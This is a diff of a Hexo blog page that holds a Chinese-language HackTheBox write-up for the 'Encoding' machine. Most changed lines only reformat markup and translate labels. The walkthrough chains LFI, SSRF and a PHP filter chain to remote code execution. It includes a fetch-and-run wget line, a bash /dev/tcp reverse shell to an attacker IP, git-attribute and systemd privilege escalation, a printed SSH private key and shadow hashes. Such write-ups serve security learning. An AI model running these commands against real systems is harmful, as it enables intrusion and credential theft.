@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;526  10.10.11.198                                                                                                              端口扫描22和80: 12345678">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;526  10.10.11.198   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.198Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-02-02 13:38">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Encoding - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/02/02/Encoding-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;526  10.10.11.198                                                                                                              端口扫描22和80: 12345678">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;526  10.10.11.198   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.198Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-02-02 13:38">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020201.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020202.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020203.jpg">
@@ -128,8 +128,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -151,7 +158,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -219,28 +226,14 @@
 </li>
 <li><h2 id="10-10-11-198"><a href="#10-10-11-198" class="headerlink" title="10.10.11.198"></a>10.10.11.198</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020201.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020201.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.198</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 13:38 CST</span><br><span class="line">Nmap scan report for 10.10.11.198</span><br><span class="line">Host is up (0.096s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_http-title: HaxTables</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 33.02 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>API中得到域名信息：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020202.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020202.jpg" alt=""></p>
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>根据得到的域名格式添加hosts，继续探测子域名：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.198 haxtables.htb api.haxtables.htb</span><br></pre></td></tr></table></figure>
 
@@ -248,50 +241,15 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://haxtables.htb/" -H 'Host: FUZZ.haxtables.htb' -fs 1999</span><br><span class="line"></span><br><span class="line">api                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 111ms]</span><br><span class="line">image                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 95ms]</span><br></pre></td></tr></table></figure>
 
 <h2 id="image-haxtables-htb"><a href="#image-haxtables-htb" class="headerlink" title="image.haxtables.htb"></a>image.haxtables.htb</h2><p>添加hosts，直接访问是403:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020203.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020203.jpg" alt=""></p>
 <h1 id="api-haxtables-htb"><a href="#api-haxtables-htb" class="headerlink" title="api.haxtables.htb"></a>api.haxtables.htb</h1><p>根据给出的api调用代码调用api，发现一个读取远程文件的调用方式，这里可以LFI：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020204.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020205.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020206.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020204.jpg" alt=""></p>
+<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020205.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020206.jpg" alt=""></p>
 <h2 id="image-git"><a href="#image-git" class="headerlink" title="image .git"></a>image .git</h2><p>一步步读文件,utils里发现git：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;image&#x2F;index.php</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;image&#x2F;utils.php</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020207.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020207.jpg" alt=""></p>
 <h1 id="image-haxtables-htb-1"><a href="#image-haxtables-htb-1" class="headerlink" title="image.haxtables.htb"></a>image.haxtables.htb</h1><p>通过git dump代码,但因为image的403限制，需要改下工具代码：</p>
 <ul>
 <li>GitTools/Dumper at master · internetwache/GitTools<br><a href="https://github.com/internetwache/GitTools/tree/master/Dumper" target="_blank" rel="noopener">https://github.com/internetwache/GitTools/tree/master/Dumper</a></li>
@@ -304,45 +262,17 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gitdumper.sh http://image.haxtables.htb/.git/ image_git_dump</span><br></pre></td></tr></table></figure>
 
 <p>git信息的到的一些文件名，继续使用前面的LFI读代码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020208.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020208.jpg" alt=""></p>
 <h2 id="actions-action-handler-php"><a href="#actions-action-handler-php" class="headerlink" title="actions/action_handler.php"></a>actions/action_handler.php</h2><p>action_handler中发现LFI：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'utils.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">    <span class="keyword">include</span>($page);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">'message'</span> =&gt; <span class="string">'No page specified!'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="handler-php"><a href="#handler-php" class="headerlink" title="handler.php"></a>handler.php</h2><p>主站的handler中发现SSRF，接收到的uri_path会进入make_api_call,拼接在中间，所以也需要处理一下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;handler.php</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;api&#x2F;utils.php</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020209.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020210.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020209.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020210.jpg" alt=""></p>
 <h2 id="SSRF-LFI"><a href="#SSRF-LFI" class="headerlink" title="SSRF + LFI"></a>SSRF + LFI</h2><p>所以可以通过handler的SSRF去调用image的LFI：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020211.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020211.jpg" alt=""></p>
 <h1 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI to RCE"></a>LFI to RCE</h1><p>参考资料，和Pollution那台类似：</p>
 <ul>
 <li>hxp CTF 2021 - The End Of LFI? - 跳跳糖<br><a href="https://tttang.com/archive/1395/" target="_blank" rel="noopener">https://tttang.com/archive/1395/</a></li>
@@ -351,76 +281,27 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> m</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">python3 php_filter_chain_generator.py --chain '&lt;?=`wget -O - 10.10.14.7/m|bash`?&gt;'</span><br></pre></td></tr></table></figure>
 
 <p> 然后替换page参数，得到shell：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020212.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020212.jpg" alt=""></p>
 <h1 id="svc"><a href="#svc" class="headerlink" title="svc"></a>svc</h1><p>得到的www shell可以以svc用户权限运行git-commit.sh：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020213.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020213.jpg" alt=""></p>
 <p>根据代码，用于git commit，可以通过附加Attribute执行其他操作：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020214.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020214.jpg" alt=""></p>
 <ul>
 <li>Git - Git Attributes<br><a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes" target="_blank" rel="noopener">https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes</a></li>
 </ul>
 <p>我们可以在/var/www/image文件夹中初始化一个新的版本库，为所有.php文件设置缩进过滤器，设置一个运行bash文件的命令来生成反向shell，最后，以svc用户身份运行git-commit.sh文件。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">/tmp/shell</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">chmod +x /tmp/shell</span><br><span class="line"></span><br><span class="line">cd /var/www/image</span><br><span class="line">git init</span><br><span class="line">echo '*.php filter=indent' &gt; .git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/shell</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020215.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020216.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020215.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020216.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>svc用户目录里可以获取私钥方便后续操作：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020217.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020217.jpg" alt=""></p>
 <h2 id="svc-id-rsa"><a href="#svc-id-rsa" class="headerlink" title="svc_id_rsa"></a>svc_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAlnPbNrAswX0YLnW3sx1l7WN42hTFVwWISqdx5RUmVmXbdVgDXdzH</span><br><span class="line">&#x2F;ZBNxIqqMXE8DWyNpzcV&#x2F;78rkU4f2FF&#x2F;rWH26WfFmaI&#x2F;Zm9sGd5l4NTON2lxAOt+8aUyBR</span><br><span class="line">xpVYNSSK+CkahQ2XDO87IyS4HV4cKUYpaN&#x2F;efa+XyoUm6mKiHUbtyUYGAfebSVxU4ur1Ue</span><br><span class="line">vSquljs+Hcpzh5WKRhgu&#x2F;ojBDQdKWd0Q6bn75TfRBSu6u&#x2F;mODjjilvVppGNWJWNrar8eSZ</span><br><span class="line">vbqMlV509E6Ud2rNopMelmpESZfBEGoJAvEnhFaYylsuC7IPEWMi82&#x2F;3Vyl7RAgeT0zPjq</span><br><span class="line">nHiPCJykLYvxkvsRnIBFxesZL+AkbHYHEn3fyH16Pp8ZZmIIJN3WQD&#x2F;SRJOTDh&#x2F;fmWy6r7</span><br><span class="line">oD+urq6+rEqTV0UGDk3YXhhep&#x2F;LYnszZAZ2HNainM+iwtpDTr3rw+B+OH6Z8Zla1YvBFvL</span><br><span class="line">oQOAsqE2FUHeEpRspb57uDeKWbkrNLU5cYUhuWBLAAAFiEyJeU9MiXlPAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJZz2zawLMF9GC51t7MdZe1jeNoUxVcFiEqnceUVJlZl23VYA13cx&#x2F;2QTcSKqjFx</span><br><span class="line">PA1sjac3Ff+&#x2F;K5FOH9hRf61h9ulnxZmiP2ZvbBneZeDUzjdpcQDrfvGlMgUcaVWDUkivgp</span><br><span class="line">GoUNlwzvOyMkuB1eHClGKWjf3n2vl8qFJupioh1G7clGBgH3m0lcVOLq9VHr0qrpY7Ph3K</span><br><span class="line">c4eVikYYLv6IwQ0HSlndEOm5++U30QUrurv5jg444pb1aaRjViVja2q&#x2F;Hkmb26jJVedPRO</span><br><span class="line">lHdqzaKTHpZqREmXwRBqCQLxJ4RWmMpbLguyDxFjIvNv91cpe0QIHk9Mz46px4jwicpC2L</span><br><span class="line">8ZL7EZyARcXrGS&#x2F;gJGx2BxJ938h9ej6fGWZiCCTd1kA&#x2F;0kSTkw4f35lsuq+6A&#x2F;rq6uvqxK</span><br><span class="line">k1dFBg5N2F4YXqfy2J7M2QGdhzWopzPosLaQ06968Pgfjh+mfGZWtWLwRby6EDgLKhNhVB</span><br><span class="line">3hKUbKW+e7g3ilm5KzS1OXGFIblgSwAAAAMBAAEAAAGAF7nXhQ1NUYoHqTP5Ly7gpwn7wf</span><br><span class="line">BqmmmN76&#x2F;uPyERtahEboHdrgymIS+DhA4V&#x2F;swLm1ZWFFuUhYtBNJ3sWbGof9AmHvK1b5&#x2F;t</span><br><span class="line">fZruojm3OTh1+LkREAMTNspFVBcB6XFXJY0&#x2F;+vZfIZsvl7CvS8cC0qJbwhxZ8gOBPbzR0o</span><br><span class="line">YOgDBrjrwMThJ6hDfdMos8w3uZ6Fz1wU1AY3RMucH0V09zAcLRJtvSds9s3l7tAV3HAZi+</span><br><span class="line">zuvw4f9IhGPZMApWSHkf9nsIFD1miD9n31E5uFYHxF+4OIYBw+IvWoH2f3JkzWpTh845p0</span><br><span class="line">VyX4+8SdEhONX7CkdprVnfeLH8+cuxhFSKE4Vlz5Zer0HvESIpMq0sHp3zcKP8wIBF30US</span><br><span class="line">abakUHBmd&#x2F;k4Ssw6oUg06hLm5xRI8d8kDJ2JhE9AmM4jSuW+kuHzTn&#x2F;xpK+VQHVKNhASbD</span><br><span class="line">EO436iRABccefgHzTTLJaUKnDQvHVT5mE5xwYdIBpchN2O8z9VgkkKt0LVtPU1HauxAAAA</span><br><span class="line">wAw5Y6bFzH3wtun0gOtWfLfm6pluFtdhPivtjXNr+4kqxVfcq1vriwjzpSTiZXtDXfdvWn</span><br><span class="line">BN2rpzw5l0ZCmhLBxVl+qUNQo0RWCNOC6BRm3Tfyt&#x2F;FddoDkQdl83zs5ts8A6w3aAynGv3</span><br><span class="line">Qrh3bR&#x2F;LvxvvCGynS5iHedOBMCBl5zqgBni&#x2F;EsaQuGGD6&#x2F;4Vi7o2z+i1U7&#x2F;EUuQ3eeJ&#x2F;pi</span><br><span class="line">MGXN&#x2F;7r1Ey3IinPA5omtDn9FplaoljCHfRkH8XIOjxle0+sQAAAMEAvZcUrFEfQES3J8yr</span><br><span class="line">DWk2ts8UL1iX4G4LqD34f7AUEtj4Jnr&#x2F;D6fnl&#x2F;FOSKuCK+Z4OFCh74H0mogGAOvC1bKCkD</span><br><span class="line">&#x2F;Q&#x2F;KSdSb2x&#x2F;6+EOdBPD7X&#x2F;73W7kiio&#x2F;phrqwARFWZRcX4PyiOeKI6h5UFPERXBOse84pqa</span><br><span class="line">d01VWSE7ulFwqExaEBtF9kWlruGd&#x2F;C4GmxUkCEpOsBWa1HjhrY36J99fiQDkI8F5xAfQrr</span><br><span class="line">5BlTXUg4hYsAx2dA71qDV4NgvuL7QTAAAAwQDLJzsl6ZfIKEYaN1klK1tfJ+yz8Hzgn0+D</span><br><span class="line">Y0RjyEuNhw2ZbIV7llFeGC7q8NfHKxuO6XQyJBBoTgZTQQSTRO3E1&#x2F;i7fRB73P+++CyIt4</span><br><span class="line">65ER&#x2F;Evu+QPxwElDkxiQCR9p3wrMwpuR4Aq4RwxkJtZNLcE3o8TOqpxoKXEpOWKZRx52kZ</span><br><span class="line">F1ul2Aqwml1hQYQGXfr+BCkEdaskZxCTdNL3U548+&#x2F;SpBnh8YXYKMsH2L70JHgo940ZjYn</span><br><span class="line">&#x2F;aFyar4fo4+ekAAAAMc3ZjQGVuY29kaW5nAQIDBAUGBw&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>可以重启任意服务，那就是自己创建一个服务利用了</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo '[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=bash /tmp/shell</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target' &gt; /etc/systemd/system/root.service</span><br><span class="line"></span><br><span class="line">sudo systemctl restart root</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020218.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020218.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$YrcgmNEZARoBVHavwBOPQ&#x2F;$wIZaX9iidgZlQcbd8FsfhAK4e9f6CCS0R8zTG7iGZWC:19307:0:99999:7:::</span><br><span class="line">svc:$y$j9T$T1FiJZK9ftARU8F2cRXIo&#x2F;$l4ru4RucHv80YP2Nv2KwwZbJmem.ongM5S8FbfbOTp9:19307:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
@@ -442,7 +323,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-04-17T00:51:41.690Z" itemprop="dateUpdated">2023-04-17 08:51:41</time>
+    Last updated: <time datetime="2023-04-17T00:51:41.690Z" itemprop="dateUpdated">2023-04-17 08:51:41</time>
 </span><br>
 
 
@@ -609,11 +490,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
